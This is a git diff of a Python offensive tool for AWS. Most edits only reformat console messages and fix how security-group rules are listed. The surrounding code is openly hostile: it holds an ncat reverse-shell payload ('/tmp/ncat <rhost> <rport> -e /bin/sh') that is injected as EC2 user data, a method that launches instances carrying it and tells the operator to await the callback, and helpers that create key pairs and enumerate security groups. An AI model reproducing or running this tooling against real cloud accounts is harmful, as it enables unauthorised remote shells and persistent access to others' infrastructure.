@@ -18,16 +18,16 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         def _create(key_name: str, dry: bool=True):
             try:
                 if not dry:
-                    self.console.print(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
+                    self.console.print(f"> Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
                     key_pair = self.ec2.create_key_pair(
                         KeyName=key_name,
                         DryRun=dry
                     )
-                    self.console.print("Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
+                    self.console.print("> Creating directory: `keys` ([bold blue]CREATED DIRECTORY[/bold blue]) ")
                     if not exists("./keys"):
                         mkdir("./keys")
                     with open(f"./keys/{key_name}.pem", "w") as priv_key:
-                        self.console.print(f"Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
+                        self.console.print(f"> Writing PEM key to file: `./keys/{key_name}.pem`.. ([bold blue]CREATED FILE[/bold blue])")
                         priv_key.write(key_pair["KeyMaterial"])
                 else:
                     self.ec2.create_key_pair(
@@ -42,7 +42,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
 
         success = _create(key_name)
         if success:
-            self.console.print("You have the required permissions to create a key pair ([green]SUCCESS[/green])")
+            self.console.print("> You have the required permissions to create a key pair ([green]SUCCESS[/green])")
             if y_n := self.console.input(
                 "Would you like to create the key pair? (y/n): "
             ).strip().lower() == "y":
@@ -51,7 +51,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
                 self.console.print("Adios...")
                 exit(1)
         else:
-            self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
+            self.console.print(">> You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
     # [END _create_key_pair]
 
     # [START _run_instance]
@@ -87,7 +87,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
         except ClientError as e:
             self.console.log("An error occured.. ([red]ERROR[/red])")
             exit()
-        self.console.print("Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
+        self.console.print("> Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
         instance_id = results["Instances"][0]["InstanceId"]
         self.console.print(' '* 3+"\u2022 Instance ID:", instance_id)
         self.console.print("Retrieving instance public IP address.. ([blue]INFO[/blue])")
@@ -96,7 +96,7 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
             results = self.ec2.describe_instances(InstanceIds=[instance_id])
             self.console.print(' '*3+"\u2022 Public IP Address:", results["Reservations"][0]["Instances"][0]["PublicIpAddress"])
         except ClientError:
-            self.console.log("An error occured while attempting to retrieve instance public IP address.. ([red]ERROR[/red])")
+            self.console.log(">> An error occured while attempting to retrieve instance public IP address.. ([red]ERROR[/red])")
             exit()
     # [END _run_instance]
 
@@ -112,13 +112,13 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
 
     # [START user_data_rev_shell]
     def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int):
-        self.console.print("Creating reverse shell user data script.. ([blue]INFO[/blue])")
+        self.console.print("> Creating reverse shell user data script.. ([blue]INFO[/blue])")
         self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
         self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
         _tmp_payload = self.user_data_payload.replace(" && ", "\n")
-        self.console.print(f"User data payload.. ([yellow]PREVIEW[/yellow])")
+        self.console.print(f"> User data payload.. ([yellow]PREVIEW[/yellow])")
         self.console.print("-"*70+f"\n{_tmp_payload}\n"+"-"*70)
-        self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])")
+        self.console.print("> Running instance with reverse shell user data script.. ([green]OK[/green])")
         self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
         self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
     # [END user_data_rev_shell]
@@ -136,9 +136,9 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     # [START get_security_groups]
     def get_security_groups(self):
         for security_group in self.ec2.describe_security_groups()["SecurityGroups"]:
+            cidrs = []
+            descriptions = []
             for rule in security_group["IpPermissions"]:
-                cidrs = []
-                descriptions = []
                 protocol = rule["IpProtocol"]
                 if protocol == "-1":
                     continue
@@ -148,8 +148,10 @@ chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
             if cidrs:
                 self.console.print(f"[red]SecurityGroupName[/red]: {security_group['GroupName']}")
                 self.console.print("[#FFA500 underline]Rules[/#FFA500 underline]")
-                self.console.print(
-                    " "*3, f"\u2022 From {str(cidrs)}::{rule['FromPort']}",
-                    "\u2192", f"::{rule['ToPort']}", f"([bold yellow]ALLOW[/bold yellow])\n"
-                )
+                for entry in cidrs:
+                    self.console.print(
+                        " "*3, f"\u2022 From {str(entry)}::{rule['FromPort']}",
+                        "\u2192", f"::{rule['ToPort']}", f"([bold yellow]ALLOW[/bold yellow])"
+                    )
+                print()
     # [END get_security_groups]
